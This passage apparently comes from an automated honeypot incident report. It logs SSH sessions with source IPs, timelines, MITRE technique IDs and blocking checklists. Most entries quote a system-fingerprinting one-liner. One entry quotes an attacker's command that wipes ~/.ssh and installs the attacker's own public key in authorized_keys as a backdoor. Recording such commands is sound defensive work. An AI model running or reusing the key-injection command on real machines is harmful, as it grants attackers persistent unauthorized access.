| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:46:15` | `cowrie.session.connect` |
| `2026-07-05 03:46:15` | `cowrie.client.version` |
| `2026-07-05 03:46:15` | `cowrie.client.kex` |
| `2026-07-05 03:46:18` | `cowrie.login.success` |
| `2026-07-05 03:46:20` | `cowrie.session.params` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.success` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:20` | `cowrie.command.input` |
| `2026-07-05 03:46:22` | `cowrie.log.closed` |
| `2026-07-05 03:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-639d0c2b324d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:47 |
| **Last Seen** | 2026-07-05 03:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:47:45` | `cowrie.session.connect` |
| `2026-07-05 03:47:45` | `cowrie.client.version` |
| `2026-07-05 03:47:45` | `cowrie.client.kex` |
| `2026-07-05 03:47:48` | `cowrie.login.success` |
| `2026-07-05 03:47:50` | `cowrie.session.params` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.success` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:50` | `cowrie.command.input` |
| `2026-07-05 03:47:51` | `cowrie.log.closed` |
| `2026-07-05 03:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bf17d5f400e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:49 |
| **Last Seen** | 2026-07-05 03:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:49:14` | `cowrie.session.connect` |
| `2026-07-05 03:49:15` | `cowrie.client.version` |
| `2026-07-05 03:49:15` | `cowrie.client.kex` |
| `2026-07-05 03:49:18` | `cowrie.login.success` |
| `2026-07-05 03:49:19` | `cowrie.session.params` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.success` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:19` | `cowrie.command.input` |
| `2026-07-05 03:49:20` | `cowrie.log.closed` |
| `2026-07-05 03:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3446b511a76

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:50 |
| **Last Seen** | 2026-07-05 03:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:50:43` | `cowrie.session.connect` |
| `2026-07-05 03:50:43` | `cowrie.client.version` |
| `2026-07-05 03:50:43` | `cowrie.client.kex` |
| `2026-07-05 03:50:47` | `cowrie.login.success` |
| `2026-07-05 03:50:47` | `cowrie.session.params` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.success` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:47` | `cowrie.command.input` |
| `2026-07-05 03:50:48` | `cowrie.log.closed` |
| `2026-07-05 03:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c46ef562e908

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:52 |
| **Last Seen** | 2026-07-05 03:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:52:11` | `cowrie.session.connect` |
| `2026-07-05 03:52:12` | `cowrie.client.version` |
| `2026-07-05 03:52:12` | `cowrie.client.kex` |
| `2026-07-05 03:52:15` | `cowrie.login.success` |
| `2026-07-05 03:52:16` | `cowrie.session.params` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.success` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:16` | `cowrie.command.input` |
| `2026-07-05 03:52:17` | `cowrie.log.closed` |
| `2026-07-05 03:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9012904e81c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 03:53 |
| **Last Seen** | 2026-07-05 03:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:53:35` | `cowrie.session.connect` |
| `2026-07-05 03:53:37` | `cowrie.client.version` |
| `2026-07-05 03:53:37` | `cowrie.client.kex` |
| `2026-07-05 03:53:43` | `cowrie.login.success` |
| `2026-07-05 03:53:47` | `cowrie.session.params` |
| `2026-07-05 03:53:47` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.log.closed` |
| `2026-07-05 03:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-870be0d5ddb9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:53 |
| **Last Seen** | 2026-07-05 03:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:53:43` | `cowrie.session.connect` |
| `2026-07-05 03:53:44` | `cowrie.client.version` |
| `2026-07-05 03:53:44` | `cowrie.client.kex` |
| `2026-07-05 03:53:47` | `cowrie.login.success` |
| `2026-07-05 03:53:48` | `cowrie.session.params` |
| `2026-07-05 03:53:48` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.success` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:49` | `cowrie.command.input` |
| `2026-07-05 03:53:50` | `cowrie.log.closed` |
| `2026-07-05 03:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667286b8c14b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:55 |
| **Last Seen** | 2026-07-05 03:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:55:11` | `cowrie.session.connect` |
| `2026-07-05 03:55:11` | `cowrie.client.version` |
| `2026-07-05 03:55:11` | `cowrie.client.kex` |
| `2026-07-05 03:55:13` | `cowrie.login.success` |
| `2026-07-05 03:55:14` | `cowrie.session.params` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.success` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:14` | `cowrie.command.input` |
| `2026-07-05 03:55:15` | `cowrie.log.closed` |
| `2026-07-05 03:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84efcd023fb

| Field | Detail |
|---|---|
| **Source IP** | `118.99.114[.]224` |
| **First Seen** | 2026-07-05 03:55 |
| **Last Seen** | 2026-07-05 03:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:55:43` | `cowrie.session.connect` |
| `2026-07-05 03:55:43` | `cowrie.client.version` |
| `2026-07-05 03:55:44` | `cowrie.client.kex` |
| `2026-07-05 03:55:45` | `cowrie.login.success` |
| `2026-07-05 03:55:46` | `cowrie.session.params` |
| `2026-07-05 03:55:46` | `cowrie.command.input` |
| `2026-07-05 03:55:46` | `cowrie.command.failed` |
| `2026-07-05 03:55:46` | `cowrie.log.closed` |
| `2026-07-05 03:55:47` | `cowrie.session.params` |
| `2026-07-05 03:55:47` | `cowrie.command.input` |
| `2026-07-05 03:55:47` | `cowrie.session.file_download` |
| `2026-07-05 03:55:47` | `cowrie.log.closed` |
| `2026-07-05 03:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.114[.]224` to AbuseIPDB if not already reported
- [ ] Block `118.99.114[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2957dc2b1144

| Field | Detail |
|---|---|
| **Source IP** | `118.99.114[.]224` |
| **First Seen** | 2026-07-05 03:55 |
| **Last Seen** | 2026-07-05 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:55:48` | `cowrie.session.connect` |
| `2026-07-05 03:55:48` | `cowrie.client.version` |
| `2026-07-05 03:55:48` | `cowrie.client.kex` |
| `2026-07-05 03:55:49` | `cowrie.login.success` |
| `2026-07-05 03:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.114[.]224` to AbuseIPDB if not already reported
- [ ] Block `118.99.114[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9e551fe439

| Field | Detail |
|---|---|
| **Source IP** | `118.99.114[.]224` |
| **First Seen** | 2026-07-05 03:55 |
| **Last Seen** | 2026-07-05 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:55:49` | `cowrie.session.connect` |
| `2026-07-05 03:55:49` | `cowrie.client.version` |
| `2026-07-05 03:55:50` | `cowrie.client.kex` |
| `2026-07-05 03:55:51` | `cowrie.login.success` |
| `2026-07-05 03:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.114[.]224` to AbuseIPDB if not already reported
- [ ] Block `118.99.114[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791ead01ebbb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:56 |
| **Last Seen** | 2026-07-05 03:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:56:38` | `cowrie.session.connect` |
| `2026-07-05 03:56:39` | `cowrie.client.version` |
| `2026-07-05 03:56:39` | `cowrie.client.kex` |
| `2026-07-05 03:56:41` | `cowrie.login.success` |
| `2026-07-05 03:56:42` | `cowrie.session.params` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.success` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.command.input` |
| `2026-07-05 03:56:42` | `cowrie.log.closed` |
| `2026-07-05 03:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d705126b1a8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:58 |
| **Last Seen** | 2026-07-05 03:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:58:05` | `cowrie.session.connect` |
| `2026-07-05 03:58:06` | `cowrie.client.version` |
| `2026-07-05 03:58:06` | `cowrie.client.kex` |
| `2026-07-05 03:58:08` | `cowrie.login.success` |
| `2026-07-05 03:58:10` | `cowrie.session.params` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.success` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:10` | `cowrie.command.input` |
| `2026-07-05 03:58:11` | `cowrie.log.closed` |
| `2026-07-05 03:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-146bbcbee671

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:59 |
| **Last Seen** | 2026-07-05 03:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:59:31` | `cowrie.session.connect` |
| `2026-07-05 03:59:32` | `cowrie.client.version` |
| `2026-07-05 03:59:32` | `cowrie.client.kex` |
| `2026-07-05 03:59:35` | `cowrie.login.success` |
| `2026-07-05 03:59:35` | `cowrie.session.params` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.success` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:35` | `cowrie.command.input` |
| `2026-07-05 03:59:36` | `cowrie.log.closed` |
| `2026-07-05 03:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-633a68c7aca5

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]71` |
| **First Seen** | 2026-07-05 04:00 |
| **Last Seen** | 2026-07-05 04:05 |
